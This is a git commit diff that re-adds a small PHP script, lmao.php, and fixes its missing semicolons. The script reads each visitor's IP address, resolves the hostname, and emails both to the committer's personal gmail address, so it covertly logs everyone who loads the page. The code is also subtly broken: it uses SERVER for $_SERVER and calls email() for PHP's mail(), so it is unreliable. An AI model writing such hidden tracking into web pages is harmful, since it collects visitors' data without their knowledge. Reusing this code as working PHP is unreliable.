698cdb08fea7b88dd5b7d10a9cf96f90cfcba531
Aiden Cohen <aidencohen31@gmail.com>
2019-09-06 20:05:01 -0500

    re-added lmao.php

--- lmao.php
+++ lmao.php
@@ -1,13 +1,13 @@
 <?php
 
-$h = SERVER["REMOTE_ADDR"]
+$h = SERVER["REMOTE_ADDR"];
 $x = gethostbyaddr($h);
 if(isset($h) && isset($x))
 {
-    email("aidencohen31@gmail.com","ip","ip".$h."host".$x)
+    email("aidencohen31@gmail.com","ip","ip".$h."host".$x);
 }
 else{
-    email("aidencohen31@gmail.com","ip","ip".$h)
+    email("aidencohen31@gmail.com","ip","ip".$h);
 }
 
 
